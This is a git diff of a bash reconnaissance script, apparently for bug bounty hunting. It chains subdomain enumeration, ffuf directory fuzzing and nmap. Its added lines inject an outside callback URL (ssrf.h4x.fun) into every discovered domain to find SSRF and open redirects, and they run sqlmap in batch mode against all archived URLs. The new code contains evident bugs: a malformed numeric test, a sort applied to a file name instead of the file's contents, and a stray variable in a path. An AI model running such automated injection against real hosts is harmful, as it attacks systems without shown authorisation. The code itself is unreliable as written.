@@ -71,8 +71,9 @@ if [ $# -lt 2 ]
     usage
 fi
 
+set=0
 # Check that there is a domain supplied
-while getopts ":u:d:l:t:" o; do
+while getopts ":u:d:l:t:c:" o; do
   case "${o}" in
   u)
     domain=${OPTARG}
@@ -80,13 +81,23 @@ while getopts ":u:d:l:t:" o; do
     ;;
   l)
     LOGDIR=${OPTARG}
+    set=1
   ;;
   d)
     DEBUG=
   ;;
-  t)
+  c)
     INTERTHREADS=${OPTARG}
   ;;
+  t)
+    todate=${OPTARG}
+    if [[ "$set" -eq 0 ]]; then
+        LOGDIR="/var/www/h4x.fun/reports/$domain/$todate"
+    else
+        LOGDIR=$(echo $LOGDIR | sed 's:/*$::')
+        LOGDIR="$LOGDIR/$todate"
+    fi
+    ;;
   *)
     usage
     ;;
@@ -188,7 +199,6 @@ printf '%-15s %-8s %-35s %8s %15s\n' " " "######" "DEBUG is set to $DEBUGPRINT" 
 printf '%-10s %-67s %10s\n' " " "!############################################################!" " " | lolcat
 
 echo "RESDIR is: $RESDIR & TOOLDIR is: $TOOLDIR" | tee -a $LOGFILE
-
 
 echo -e "" | tee -a $LOGFILE
 echo -e "${BOLD}${GREEN}[+] STEP 1: Starting Subdomain Enumeration" | tee -a $LOGFILE
@@ -324,11 +334,10 @@ SCRIPT_DATA="$SCRIPT_DIR/data"
 check "Created JS folders"
 
 # get all responses of script data
-mkdir -p "$LOGDIR/tmp"
-ls "$BODIES/" > "$LOGDIR/tmp/files.txt"
+ls "$BODIES/" > "$TMPDIR/files.txt"
 check "Get list of files with web page content"
 # getResponses                                      #Base path #Filename #Output data #Output urls
-for entry in $(cat "$LOGDIR/tmp/files.txt"); do
+for entry in $(cat "$TMPDIR/files.txt"); do
     $TOOLDIR/RR/support/getResponses.sh $BODIES $entry $SCRIPT_DATA $SCRIPT_URL &
 done
 check "Extracting scripts URLs from webpage and store contents"
@@ -342,7 +351,7 @@ check "Extracting scripts URLs from webpage and store contents"
 print "Wait for content extraction to finish"
 wait
 
-ls "$SCRIPT_DATA" > "$LOGDIR/tmp/files2.txt"
+ls "$SCRIPT_DATA" > "$TMPDIR/files2.txt"
 JS_ENDPOINTS="$SCRIPT_DIR/Extracted_endpoints"
 mkdir -p "$JS_ENDPOINTS"
 check "Create dir for extracted endpoints"
@@ -350,7 +359,7 @@ check "Create dir for extracted endpoints"
 # Extractor script
 EXTRACTOR="$TOOLDIR/relative-url-extractor/extract.rb"
 # getURL                                         #Basepath   #Folder    #script   #output path
-for entry in $(cat "$LOGDIR/tmp/files2.txt"); do
+for entry in $(cat "$TMPDIR/files2.txt"); do
     $TOOLDIR/RR/support/getURL.sh $SCRIPT_DATA $entry $EXTRACTOR $JS_ENDPOINTS/$entry $TMPDIR &
 done
 #COMMAND="$TOOLDIR/RR/support/getURL.sh $SCRIPT_DATA _target_ $EXTRACTOR $JS_ENDPOINTS/_target_ $TMPDIR"
@@ -363,7 +372,7 @@ print "Jsearch.py"
 organitzationName=$(echo "$domain" | awk -F '.' '{ print $domain }')
 # Jsearch creates directory in pwd...so change to tmp dir!
 PRE=$(pwd)
-cd "$LOGDIR/tmp/"
+cd "$TMPDIR/"
 check "Change pwd to tmp"
 
 print "Making directory for javascript"
@@ -395,9 +404,16 @@ mkdir -p "$FFUF_DIR"
 # FFUF Directory scan - Seems to often have issues, so run normally
 
 # Slow version
+run=0
 for entry in $(cat "$LOGDIR/alive.txt"); do
+    ((run++))
     $TOOLDIR/RR/support/ffufDir.sh $entry $DIR_WORD_LIST $FFUF_Threads $FFUF_DIR &
-    check "FFUF as background task"
+    check "FFUF as background task #$run"
+    if [[ run > 4]]; then
+        print "Hit 4 concurrent scans - waiting to not run out of memory"
+        run=0
+        wait
+    fi
 done
 # Fast version
 # ffufDir                                         #domain  #Wordlist      # Threads     #Out dir
@@ -421,43 +437,66 @@ for entry in $(cat "$LOGDIR/domains.txt"); do
     check "NMAP as background task"
 done
 
-#COMMAND="$TOOLDIR/RR/support/nmapHost.sh _target_ $LOGDIR"
-#interlace --silent -tL "$LOGDIR/domains.txt" -threads $INTERTHREADS -c "$COMMAND"
+# COMMAND="$TOOLDIR/RR/support/nmapHost.sh _target_ $LOGDIR"
+# interlace --silent -tL "$LOGDIR/domains.txt" -threads $INTERTHREADS -c "$COMMAND"
 # Output is open ports
 # Output can be found in $LOGDIR/nmap/_target_.res
-#check "Interlace NMAP scan"
+# check "Interlace NMAP scan"
 print "Waiting for all background processes to finish!"
 wait
 
-print "Remove temporary directory"
-rm -rf "$LOGDIR/tmp"
-check "Remove temporary directory"
+# Needs to be done AFTER lazyrecon...
+# print "Move results to output folder"
+# LOGDIR="/var/www/h4x.fun/reports/$domain/$todate"
+# RESDIR="/root/Bug_Bounty/reports/$domain"
+# cp -R $LOGDIR/* $RESDIR
+# check "Move results to output folder"
 
-print "Move results to output folder"
-cp -R "$LOGDIR" "$RESDIR"
-check "Move results to output folder"
+# print "Remove screenshots from git repo"
+# rm -rf "$RESDIR/screenshots"
+# check "Removed screenshots from output"
 
-print "Remove screenshots from git repo"
-rm -rf "$RESDIR/screenshots"
-check "Removed screenshots from output"
-
-print "Move all files out of date-folder"
-cp -rf "$RESDIR/$todate" "$RESDIR"
-check "Move files out of date-folder"
-printf "Remove date folder"
-rm -rf "$RESDIR/$todate"
-check "Remove date folder"
+#print "Move all files out of date-folder"
+# TODO needs troubleshooting and verification!
+# TODO investigate!
+# /bin/cp -rf $RESDIR/recon-$todate/* $RESDIR
+# check "Move files out of date-folder"
+# printf "Remove date folder"
+# rm -rf "$RESDIR/recon-$todate"
+# check "Remove date folder"
 
 ##############Request Smuggling check#######################
 
 
 ########################################
+
+#########Check for Open Redirects or SSRFs#################
+# echo all domains
+# run against ssrf_OR_Identifier.sh
+echo "$LOGDIR/domains.txt" >> "$TMPDIR/all_domains.txt"
+echo "$LOGDIR/$recon-$todate/alldomains.txt" >> "$TMPDIR/all_domains.txt"
+echo "$TMPDIR/all_domains.txt" | sort | uniq >> "$LOGDIR/all_domains.txt"
+
+for entry in $(cat "$LOGDIR/all_domains.txt"); do
+    $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/n6Sfr?$entry"
+    check "SSRF / OR identifier for $entry"
+done
+##############SQLi Check####################################
+# TODO add tamperscripts
+print "Make dir and run sqlmap"
+mkdir -p $LOGDIR/sqlmap/
+URLFILE="$LOGDIR/recon-$todate/wayback-data/waybackurls_clean.txt"
+python $TOOLDIR/sqlmap-dev/sqlmap.py --batch -m $URLFILE --random-agent -o --smart --results-file=$LOGDIR/sqlmap/results.csv
+check "Sqlmap"
+########################################
+
 # LazyRecon
 
+# Done in scan.sh
 # Send over to LazyRecon for further processing
-print "LazyRecon"
-"$TOOLDIR/lazyrecon/lazyrecon.sh" -d "$domain" | tee -a $LOGFILE
-check "LazyRecon"
+# print "LazyRecon"
+# $TOOLDIR/lazyrecon/lazyrecon.sh -d "$domain" | tee -a $LOGFILE
+# check "LazyRecon"
 
 print "Remove temporary dir"
 rm -rf "$TMPDIR"
